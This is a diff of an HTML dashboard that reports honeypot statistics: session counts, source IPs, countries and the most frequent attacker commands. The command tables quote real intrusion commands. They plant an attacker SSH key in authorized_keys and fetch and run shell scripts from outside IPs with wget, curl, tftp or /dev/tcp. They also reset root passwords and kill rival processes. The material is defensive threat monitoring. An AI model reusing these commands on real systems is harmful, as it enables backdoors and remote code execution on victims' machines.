@@ -134,6 +134,23 @@
             .btn-close {
                 filter: invert(1);
             }
+            .stats-metric {
+                text-align: center;
+                padding: 10px;
+                border-radius: 5px;
+                background-color: #252525;
+            }
+            .stats-metric .value {
+                display: block;
+                font-size: 1.8rem;
+                font-weight: bold;
+                margin-bottom: 5px;
+            }
+            .stats-metric .label {
+                display: block;
+                font-size: 0.9rem;
+                color: #aaaaaa;
+            }
         </style>
     </head>
     <body>
@@ -144,7 +161,7 @@
                         <div class="card-body">
                             <h1 class="text-center"><i class="bi bi-shield-lock"></i> Cowrie Honeypot Analysis</h1>
                             <p class="text-center">
-                                Data collected from a Cowrie SSH/Telnet honeypot. Last updated: 2025-05-15 01:56:54
+                                Data collected from a Cowrie SSH/Telnet honeypot. Last updated: 2025-05-18 02:22:49
                             </p>
                             <div class="menu-links">
                                 <a href="#stats"><i class="bi bi-bar-chart-fill"></i> Statistics</a>
@@ -157,32 +174,47 @@
                 </div>
             </div>
 
+            <div class="row mt-4">
+                <div class="col-12">
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="bi bi-graph-up"></i> Connections Over Time
+                        </div>
+                        <div class="card-body">
+                            <div class="chart-container">
+                                <img src="images/connections_over_time.png" alt="Connections Over Time" class="img-fluid">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
             <div class="row" id="stats">
                 <div class="col-md-3">
                     <div class="card stats-card">
                         <i class="bi bi-person-lock"></i>
-                        <div class="number">130761</div>
+                        <div class="number">177014</div>
                         <div class="label">Total Sessions</div>
                     </div>
                 </div>
                 <div class="col-md-3">
                     <div class="card stats-card">
                         <i class="bi bi-globe"></i>
-                        <div class="number">4887</div>
+                        <div class="number">5210</div>
                         <div class="label">Unique IP Addresses</div>
                     </div>
                 </div>
                 <div class="col-md-3">
                     <div class="card stats-card">
                         <i class="bi bi-terminal"></i>
-                        <div class="number">50290</div>
+                        <div class="number">89123</div>
                         <div class="label">Commands Executed</div>
                     </div>
                 </div>
                 <div class="col-md-3">
                     <div class="card stats-card">
                         <i class="bi bi-stopwatch"></i>
-                        <div class="number">4.02s</div>
+                        <div class="number">4.20s</div>
                         <div class="label">Avg. Session Duration</div>
                     </div>
                 </div>
@@ -190,6 +222,83 @@
 
             <div class="row mt-4">
                 <div class="col-md-6">
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="bi bi-shield-exclamation"></i> Attack Infrastructure
+                        </div>
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">1</span>
+                                        <span class="label">Tor Exit Nodes</span>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">502</span>
+                                        <span class="label">VPN/Proxy Connections</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row mt-3">
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">0</span>
+                                        <span class="label">Data Center IPs</span>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">0</span>
+                                        <span class="label">Residential IPs</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="bi bi-exclamation-triangle"></i> Attack Risk Metrics
+                        </div>
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">4454</span>
+                                        <span class="label">Known Attackers</span>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">324</span>
+                                        <span class="label">Suspicious IPs</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row mt-3">
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">77050</span>
+                                        <span class="label">Command Errors</span>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="stats-metric">
+                                        <span class="value highlight">69.3%</span>
+                                        <span class="label">Login Success Rate</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row mt-4">
+                <div class="col-md-4">
                     <div class="card">
                         <div class="card-header">
                             <i class="bi bi-shield-lock"></i> Source IP Reputation
@@ -201,7 +310,7 @@
                         </div>
                     </div>
                 </div>
-                <div class="col-md-6">
+                <div class="col-md-4">
                     <div class="card">
                         <div class="card-header">
                             <i class="bi bi-globe"></i> Countries - Top 10
@@ -209,6 +318,18 @@
                         <div class="card-body">
                             <div class="chart-container">
                                 <img src="images/top_countries.png" alt="Top Countries">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="bi bi-hdd-network"></i> Connection Types
+                        </div>
+                        <div class="card-body">
+                            <div class="chart-container">
+                                <img src="images/connection_types.png" alt="Connection Types">
                             </div>
                         </div>
                     </div>
@@ -229,6 +350,7 @@
                                             <th>Session ID</th>
                                             <th>IP Address</th>
                                             <th>Country</th>
+                                            <th>Connection Type</th>
                                             <th>Timestamp</th>
                                             <th>Duration</th>
                                             <th>Commands</th>
@@ -237,93 +359,103 @@
                                     <tbody>
                                         
                                         <tr>
-                                            <td>34e529f8402c</td>
-                                            <td>2.228.129.230</td>
-                                            <td>Italy</td>
-                                            <td>2025-05-15 01:56:54</td>
-                                            <td>0.00s</td>
+                                            <td>33dc70f65ed4</td>
+                                            <td>203.125.118.248</td>
+                                            <td>Singapore</td>
+                                            <td>VPN/Proxy</td>
+                                            <td>2025-05-18 02:22:47</td>
+                                            <td>2.45s</td>
                                             <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>0458fa7cd4b5</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:54</td>
+                                            <td>5af6f5ead7ac</td>
+                                            <td>193.32.162.157</td>
+                                            <td>Romania</td>
                                             <td>Unknown</td>
+                                            <td>2025-05-18 02:21:19</td>
+                                            <td>12.78s</td>
                                             <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>5a1ef0d0e50a</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:50</td>
+                                            <td>489d17698d92</td>
+                                            <td>193.32.162.157</td>
+                                            <td>Romania</td>
                                             <td>Unknown</td>
+                                            <td>2025-05-18 02:21:05</td>
+                                            <td>14.10s</td>
                                             <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>cd254d654852</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:48</td>
-                                            <td>6.00s</td>
-                                            <td>1</td>
+                                            <td>e106bd39f342</td>
+                                            <td>193.32.162.157</td>
+                                            <td>Romania</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:20:52</td>
+                                            <td>11.99s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>52d4c9db53c6</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:44</td>
-                                            <td>5.00s</td>
-                                            <td>1</td>
+                                            <td>7e58a998b787</td>
+                                            <td>193.32.162.157</td>
+                                            <td>Romania</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:20:39</td>
+                                            <td>13.89s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>50addf4f4099</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:43</td>
-                                            <td>5.00s</td>
-                                            <td>1</td>
+                                            <td>1cf4f6dceea1</td>
+                                            <td>193.32.162.157</td>
+                                            <td>Romania</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:20:25</td>
+                                            <td>13.18s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>25f7e3749de5</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:39</td>
-                                            <td>5.00s</td>
-                                            <td>1</td>
+                                            <td>02559eaa9453</td>
+                                            <td>185.93.89.118</td>
+                                            <td>Iran</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:19:41</td>
+                                            <td>16.27s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>f5934eeb639f</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:37</td>
-                                            <td>6.00s</td>
-                                            <td>1</td>
+                                            <td>24ea345511f2</td>
+                                            <td>185.93.89.118</td>
+                                            <td>Iran</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:19:27</td>
+                                            <td>14.10s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>929438bd5f8a</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:34</td>
-                                            <td>4.00s</td>
-                                            <td>1</td>
+                                            <td>ebad553a185a</td>
+                                            <td>85.85.196.35</td>
+                                            <td>Spain</td>
+                                            <td>VPN/Proxy</td>
+                                            <td>2025-05-18 02:19:20</td>
+                                            <td>11.68s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                         <tr>
-                                            <td>d58563976ac2</td>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>2025-05-15 01:56:32</td>
-                                            <td>5.00s</td>
-                                            <td>1</td>
+                                            <td>bcb0d965b5ac</td>
+                                            <td>185.93.89.118</td>
+                                            <td>Iran</td>
+                                            <td>Unknown</td>
+                                            <td>2025-05-18 02:19:12</td>
+                                            <td>15.03s</td>
+                                            <td>0</td>
                                         </tr>
                                         
                                     </tbody>
@@ -333,7 +465,6 @@
                     </div>
                 </div>
             </div>
-
             <div class="row mt-4">
                 <div class="col-md-6">
                     <div class="card">
@@ -353,52 +484,52 @@
                                         
                                         <tr>
                                             <td><code>echo -e "\x6F\x6B"</code></td>
-                                            <td>41218</td>
+                                            <td>77307</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>cd ~; chattr -ia .ssh; lockr -ia .ssh</code></td>
-                                            <td>3065</td>
+                                            <td>4173</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~</code></td>
-                                            <td>3064</td>
+                                            <td>4172</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>uname -s -v -n -r -m</code></td>
-                                            <td>2088</td>
+                                            <td>2459</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>uname -s -v -n -r</code></td>
-                                            <td>252</td>
+                                            <td>264</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>uname -a</code></td>
-                                            <td>46</td>
+                                            <td>57</td>
+                                        </tr>
+                                        
+                                        <tr>
+                                            <td><code>cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r tftp.sh -g 213.209.143.44; chmod 777 tftp.sh; sh tftp.sh</code></td>
+                                            <td>29</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>/ip cloud print</code></td>
-                                            <td>24</td>
+                                            <td>25</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>ifconfig</code></td>
-                                            <td>24</td>
+                                            <td>25</td>
                                         </tr>
                                         
                                         <tr>
                                             <td><code>cat /proc/cpuinfo</code></td>
-                                            <td>24</td>
-                                        </tr>
-                                        
-                                        <tr>
-                                            <td><code>ps | grep '[Mm]iner'</code></td>
-                                            <td>24</td>
+                                            <td>25</td>
                                         </tr>
                                         
                                     </tbody>
@@ -431,6 +562,12 @@
                                     <tbody>
                                         
                                         <tr>
+                                            <td>162.246.19.141</td>
+                                            <td>United States</td>
+                                            <td>300022</td>
+                                        </tr>
+                                        
+                                        <tr>
                                             <td>47.240.63.58</td>
                                             <td>Hong Kong</td>
                                             <td>259509</td>
@@ -461,9 +598,9 @@
                                         </tr>
                                         
                                         <tr>
-                                            <td>162.246.19.141</td>
-                                            <td>United States</td>
-                                            <td>11315</td>
+                                            <td>196.251.84.225</td>
+                                            <td>The Netherlands</td>
+                                            <td>8938</td>
                                         </tr>
                                         
                                         <tr>
@@ -479,15 +616,9 @@
                                         </tr>
                                         
                                         <tr>
-                                            <td>196.251.84.225</td>
-                                            <td>The Netherlands</td>
-                                            <td>5975</td>
-                                        </tr>
-                                        
-                                        <tr>
                                             <td>196.251.70.231</td>
                                             <td>Seychelles</td>
-                                            <td>5056</td>
+                                            <td>5317</td>
                                         </tr>
                                         
                                     </tbody>
@@ -505,7 +636,7 @@
                             <i class="bi bi-exclamation-triangle"></i> Error Statistics
                         </div>
                         <div class="card-body">
-                            <p>Detected <span class="highlight">77038</span> command errors in the logs.</p>
+                            <p>Detected <span class="highlight">77050</span> command errors in the logs.</p>
                         </div>
                     </div>
                 </div>
@@ -527,9 +658,6 @@
                                 </li>
                                 <li class="nav-item" role="presentation">
                                     <button class="nav-link" id="sources-tab" data-bs-toggle="tab" data-bs-target="#sources" type="button" role="tab">Attack Sources</button>
-                                </li>
-                                <li class="nav-item" role="presentation">
-                                    <button class="nav-link" id="reputation-tab" data-bs-toggle="tab" data-bs-target="#reputation" type="button" role="tab">IP Reputation</button>
                                 </li>
                             </ul>
                             <div class="tab-content" id="vizTabsContent">
@@ -581,16 +709,6 @@
                                         </div>
                                     </div>
                                 </div>
-                                <div class="tab-pane fade" id="reputation" role="tabpanel">
-                                    <div class="row">
-                                        <div class="col-md-8 mx-auto">
-                                            <div class="chart-container">
-                                                <h5>Source IP Reputation</h5>
-                                                <img src="images/source_ip_reputation.png" alt="Source IP Reputation">
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
                             </div>
                         </div>
                     </div>
@@ -619,66 +737,146 @@
                                     
                                     <tr>
                                         <td><code>echo -e "\x6F\x6B"</code></td>
-                                        <td>41218</td>
+                                        <td>77307</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>cd ~; chattr -ia .ssh; lockr -ia .ssh</code></td>
-                                        <td>3065</td>
+                                        <td>4173</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~</code></td>
-                                        <td>3064</td>
+                                        <td>4172</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>uname -s -v -n -r -m</code></td>
-                                        <td>2088</td>
+                                        <td>2459</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>uname -s -v -n -r</code></td>
-                                        <td>252</td>
+                                        <td>264</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>uname -a</code></td>
-                                        <td>46</td>
+                                        <td>57</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r tftp.sh -g 213.209.143.44; chmod 777 tftp.sh; sh tftp.sh</code></td>
+                                        <td>29</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>/ip cloud print</code></td>
-                                        <td>24</td>
+                                        <td>25</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>ifconfig</code></td>
-                                        <td>24</td>
+                                        <td>25</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>cat /proc/cpuinfo</code></td>
-                                        <td>24</td>
+                                        <td>25</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>ps | grep '[Mm]iner'</code></td>
-                                        <td>24</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>ps -ef | grep '[Mm]iner'</code></td>
-                                        <td>23</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo Hi | cat -n</code></td>
-                                        <td>23</td>
+                                        <td>25</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>cat /proc/cpuinfo | grep name | wc -l</code></td>
+                                        <td>25</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>ps -ef | grep '[Mm]iner'</code></td>
+                                        <td>24</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo Hi | cat -n</code></td>
+                                        <td>24</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>w</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>uname -m</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>lscpu | grep Model</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>df -h | head -n 2 | awk 'FNR == 2 {print $2;}'</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>uname -s -m</code></td>
+                                        <td>22</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>ls -lh $(which ls)</code></td>
+                                        <td>21</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>which ls</code></td>
+                                        <td>21</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>crontab -l</code></td>
+                                        <td>21</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'</code></td>
+                                        <td>20</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>cat /proc/cpuinfo | grep model | grep name | wc -l</code></td>
+                                        <td>20</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>top</code></td>
+                                        <td>20</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>uname</code></td>
+                                        <td>20</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>whoami</code></td>
                                         <td>20</td>
                                     </tr>
                                     
@@ -693,138 +891,53 @@
                                     </tr>
                                     
                                     <tr>
-                                        <td><code>cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'</code></td>
-                                        <td>18</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>w</code></td>
-                                        <td>18</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r tftp.sh -g 213.209.143.44; chmod 777 tftp.sh; sh tftp.sh</code></td>
-                                        <td>18</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>uname -s -m</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>lscpu | grep Model</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>df -h | head -n 2 | awk 'FNR == 2 {print $2;}'</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>ls -lh $(which ls)</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>which ls</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>crontab -l</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>uname -m</code></td>
-                                        <td>17</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'</code></td>
-                                        <td>16</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>uname</code></td>
-                                        <td>15</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>whoami</code></td>
-                                        <td>15</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>cat /proc/cpuinfo | grep model | grep name | wc -l</code></td>
-                                        <td>15</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>top</code></td>
-                                        <td>15</td>
-                                    </tr>
-                                    
-                                    <tr>
                                         <td><code>cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh; tftp -r ssh.sh -g 213.209.143.44; chmod 777 ssh.sh; sh ssh.sh</code></td>
                                         <td>12</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>echo TEST</code></td>
-                                        <td>6</td>
+                                        <td>10</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>echo 1 && cat /bin/echo</code></td>
-                                        <td>5</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*</code></td>
-                                        <td>4</td>
+                                        <td>8</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>enable</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>system</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>shell</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>sh</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>linuxshell</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
                                         <td><code>cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai</code></td>
-                                        <td>3</td>
+                                        <td>7</td>
                                     </tr>
                                     
                                     <tr>
-                                        <td><code>nproc</code></td>
-                                        <td>2</td>
+                                        <td><code>ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*</code></td>
+                                        <td>5</td>
                                     </tr>
                                     
                                     <tr>
@@ -833,32 +946,17 @@
                                     </tr>
                                     
                                     <tr>
-                                        <td><code>echo "root:ZuEEueFVZNLX"|chpasswd|bash</code></td>
+                                        <td><code>nproc</code></td>
+                                        <td>2</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo $((1+1))</code></td>
                                         <td>1</td>
                                     </tr>
                                     
                                     <tr>
-                                        <td><code>which apt</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:cDYg6JZ4Bd4Z"|chpasswd|bash</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>nohup $SHELL -c "curl http://36.134.194.19:60147/linux -o /tmp/sU2MUWgrNo; if [ ! -f /tmp/sU2MUWgrNo ]; then wget http://36.134.194.19:60147/linux -O /tmp/sU2MUWgrNo; fi; if [ ! -f /tmp/sU2MUWgrNo ]; then exec 6<>/dev/tcp/36.134.194.19/60147 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/sU2MUWgrNo ; chmod +x /tmp/sU2MUWgrNo && /tmp/sU2MUWgrNo NFYyc/Q3JWIQLZP/9Tni85csD2YgJeJqNERLV0cxcPQ0JWYEKpH46jH7+JQsEGcgPPR2MkVXT0M8cuo0Im4eKJbn6TXp55AtEGAgP+x0N0RPWUIxaug2JngMKJLn6jTo85csD2YiJe5zKERKQFgyffQ0I2EEKpH46Db7/ZYyDGIiK+tyKERJQ0A2de4xMGUIMpD67y7q8JUyD28qM+p1MkFZTUEofOkrImYNMpDx6Drt+ZAvBnYiNehqM0NXQUQodu81KmAOLZX5+zj1+5AsEGcnPfRwNkxPSUc1dfoxJ3gMKZPn6DX18JEmCGYhN+1kMkFXS0UxauIzPmcGKpv/6zHv/oEoCXgiNu1qNUZXSEYxfuw1IWQMPJX+9TLu/Y8oCngiMeByNkdLTVYyc/Q3I2AQLpXw9Tjq85csD2QjJe5zKERKQFg0cO8rImAEKpH46DD7/ZYyDGUpK+h0PlhMTUwwdOsxKXYKK4/x7S7p8Y8oCWwmNet3N1ZBV0Q3dPQwIHgIKZv/6zHp/4EuD2c+NO59KEdPSVg0de4/JmYPKJnp6jnp55IyB2Q+Pe1+MEZISUImcO0rJ2AQKpfn6THh/5EtDmAwNO90KEdJQFg0cOkrJmMEKpH46Tj7/ZMyD28iK+l8KEdBQ0A2dek1MGIJMpn69TLv+o8tBmQqM+p1NkBZTUEodukzPmQKJY/x6jrt+ZAuDXYkMvR2NUBXS0I1ausxI2wILJD56SDv/o8uC2Q+Nu9qP0ZDT0Y3du0lI2AQLZL99THi/Y8tB2wmNetwMVYBfFOB+L1FCCjZQ8AqG4p4NDYTrf1bF3p3L+32; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/sU2MUWgrNo && /tmp/sU2MUWgrNo NFYyc/Q3JWIQLZP/9Tni85csD2YgJeJqNERLV0cxcPQ0JWYEKpH46jH7+JQsEGcgPPR2MkVXT0M8cuo0Im4eKJbn6TXp55AtEGAgP+x0N0RPWUIxaug2JngMKJLn6jTo85csD2YiJe5zKERKQFgyffQ0I2EEKpH46Db7/ZYyDGIiK+tyKERJQ0A2de4xMGUIMpD67y7q8JUyD28qM+p1MkFZTUEofOkrImYNMpDx6Drt+ZAvBnYiNehqM0NXQUQodu81KmAOLZX5+zj1+5AsEGcnPfRwNkxPSUc1dfoxJ3gMKZPn6DX18JEmCGYhN+1kMkFXS0UxauIzPmcGKpv/6zHv/oEoCXgiNu1qNUZXSEYxfuw1IWQMPJX+9TLu/Y8oCngiMeByNkdLTVYyc/Q3I2AQLpXw9Tjq85csD2QjJe5zKERKQFg0cO8rImAEKpH46DD7/ZYyDGUpK+h0PlhMTUwwdOsxKXYKK4/x7S7p8Y8oCWwmNet3N1ZBV0Q3dPQwIHgIKZv/6zHp/4EuD2c+NO59KEdPSVg0de4/JmYPKJnp6jnp55IyB2Q+Pe1+MEZISUImcO0rJ2AQKpfn6THh/5EtDmAwNO90KEdJQFg0cOkrJmMEKpH46Tj7/ZMyD28iK+l8KEdBQ0A2dek1MGIJMpn69TLv+o8tBmQqM+p1NkBZTUEodukzPmQKJY/x6jrt+ZAuDXYkMvR2NUBXS0I1ausxI2wILJD56SDv/o8uC2Q+Nu9qP0ZDT0Y3du0lI2AQLZL99THi/Y8tB2wmNetwMVYBfFOB+L1FCCjZQ8AqG4p4NDYTrf1bF3p3L+32" &</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>head -c 3610344 > /tmp/JWYDfHWmB4</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
-                                        <td><code>echo "root:lyrS4b2Brd6P"|chpasswd|bash</code></td>
+                                        <td><code>(1+1</code></td>
                                         <td>1</td>
                                     </tr>
                                     
@@ -893,46 +991,6 @@
                                     </tr>
                                     
                                     <tr>
-                                        <td><code>echo $((1+1))</code></td>
-                                        <td>1</td>
-                                    </tr>
-                                    
-                                    <tr>
